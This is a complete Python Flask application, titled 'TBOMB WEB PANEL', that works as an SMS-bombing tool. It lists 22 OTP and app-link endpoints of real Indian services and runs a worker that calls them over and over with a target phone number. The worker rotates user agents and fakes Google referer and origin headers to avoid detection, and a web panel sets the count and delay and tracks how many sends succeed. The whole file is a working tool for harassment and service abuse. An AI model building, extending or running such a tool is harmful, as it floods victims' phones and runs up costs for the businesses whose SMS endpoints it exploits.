import os
import time
import requests
import threading
import random
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# User Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
]

# All 22 APIs from your list
SMS_APIS = [
    {"url": "https://securedapi.confirmtkt.com/api/platform/register?newOtp=true&mobileNumber={target}", "method": "GET"},
    {"url": "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php?mobile={target}", "method": "GET"},
    {"url": "https://www.allensolly.com/capillarylogin/validateMobileOrEMail", "method": "POST", "data": {"mobileoremail": "{target}"}},
    {"url": "https://www.frotels.com/appsendsms.php", "method": "POST", "data": {"mobno": "{target}"}},
    {"url": "https://www.gapoon.com/userSignup", "method": "POST", "data": {"mobile": "{target}"}},
    {"url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "data": {"phone": "{target}"}},
    {"url": "https://porter.in/restservice/send_app_link_sms", "method": "POST", "data": {"phone": "{target}"}},
    {"url": "https://cityflo.com/website-app-download-link-sms/", "method": "POST", "data": {"mobile_number": "{target}"}},
    {"url": "https://api.nnnow.com/d/api/appDownloadLink", "method": "POST", "data": {"mobileNumber": "{target}"}},
    {"url": "https://login.web.ajio.com/api/auth/signupSendOTP", "method": "POST", "data": {"mobileNumber": "{target}"}},
    {"url": "https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91{target}", "method": "GET"},
    {"url": "https://unacademy.com/api/v1/user/get_app_link/", "method": "POST", "data": {"phone": "{target}"}},
    {"url": "https://www.treebo.com/api/v2/auth/login/otp/", "method": "POST", "data": {"phone_number": "{target}"}},
    {"url": "https://www.airtel.in/referral-api/core/notify?messageId=map&rtn={target}", "method": "GET"},
    {"url": "https://pharmeasy.in/api/auth/requestOTP", "method": "POST", "data": {"contactNumber": "{target}"}},
    {"url": "https://www.mylescars.com/usermanagements/chkContact", "method": "POST", "data": {"contactNo": "{target}"}},
    {"url": "https://grofers.com/v2/accounts/", "method": "POST", "data": {"user_phone": "{target}"}},
    {"url": "https://api.dream11.com/sendsmslink", "method": "POST", "data": {"mobileNum": "{target}"}},
    {"url": "https://www.cashify.in/api/cu01/v1/app-link?mn={target}", "method": "GET"},
    {"url": "https://commonfront.paytm.com/v4/api/sendsms", "method": "POST", "data": {"phone": "{target}"}},
    {"url": "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin", "method": "POST", "data": {"phoneNumber": "{target}"}},
    {"url": "https://indialends.com/internal/a/mobile-verification_v2.ashx", "method": "POST", "data": {"jfsdfu14hkgertd": "{target}"}}
]

status_db = {"success": 0, "failed": 0, "running": False, "target": ""}

def bomb_worker(target, count, delay):
    global status_db
    status_db.update({"success": 0, "failed": 0, "running": True, "target": target})
    
    for i in range(count):
        if not status_db["running"]: break
        api = random.choice(SMS_APIS)
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Referer': 'https://www.google.com/',
            'Origin': 'https://www.google.com'
        }
        try:
            url = api["url"].replace("{target}", target)
            if api["method"] == "GET":
                r = requests.get(url, headers=headers, timeout=10)
            else:
                payload = {k: v.replace("{target}", target) for k, v in api["data"].items()}
                r = requests.post(url, data=payload, headers=headers, timeout=10)
            
            if r.status_code < 400: status_db["success"] += 1
            else: status_db["failed"] += 1
        except:
            status_db["failed"] += 1
        
        time.sleep(delay)
    
    status_db["running"] = False

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TBOMB WEB PANEL</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0f0f0f; color: #00ff00; text-align: center; padding: 20px; }
        .container { max-width: 400px; margin: auto; background: #1a1a1a; padding: 20px; border-radius: 15px; border: 2px solid #00ff00; box-shadow: 0 0 20px #00ff00; }
        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 5px; border: 1px solid #444; background: #222; color: #fff; }
        button { width: 45%; padding: 12px; margin: 5px; border-radius: 5px; border: none; font-weight: bold; cursor: pointer; }
        .btn-start { background: #28a745; color: white; }
        .btn-stop { background: #dc3545; color: white; }
        .stats { margin-top: 20px; text-align: left; background: #222; padding: 15px; border-radius: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <h1 style="color: #00ff00;">TBOMB v2.1</h1>
        <p>API Count: 22 Active</p>
        <input type="text" id="phone" placeholder="Phone Number">
        <input type="number" id="count" placeholder="SMS Count">
        <input type="number" id="delay" placeholder="Delay" value="1.5">
        <br>
        <button class="btn-start" onclick="start()">START</button>
        <button class="btn-stop" onclick="stop()">STOP</button>
        
        <div class="stats">
            <p>Status: <span id="run_status">Idle</span></p>
            <p>Target: <span id="tgt">-</span></p>
            <p>Success: <span id="sc" style="color:#28a745">0</span></p>
            <p>Failed: <span id="fl" style="color:#dc3545">0</span></p>
        </div>
    </div>

    <script>
        function start() {
            const p = document.getElementById('phone').value;
            const c = document.getElementById('count').value;
            const d = document.getElementById('delay').value;
            fetch(`/start?target=${p}&count=${c}&delay=${d}`);
        }
        function stop() { fetch('/stop'); }
        setInterval(() => {
            fetch('/status').then(r => r.json()).then(data => {
                document.getElementById('sc').innerText = data.success;
                document.getElementById('fl').innerText = data.failed;
                document.getElementById('tgt').innerText = data.target || "-";
                document.getElementById('run_status').innerText = data.running ? "BOMBING..." : "IDLE";
            });
        }, 1000);
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/start')
def start_bomb():
    target = request.args.get('target')
    count = int(request.args.get('count', 10))
    delay = float(request.args.get('delay', 1.5))
    if target and not status_db["running"]:
        threading.Thread(target=bomb_worker, args=(target, count, delay)).start()
    return jsonify({"status": "processing"})

@app.route('/status')
def get_status():
    return jsonify(status_db)

@app.route('/stop')
def stop_bomb():
    status_db["running"] = False
    return jsonify({"status": "stopped"})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
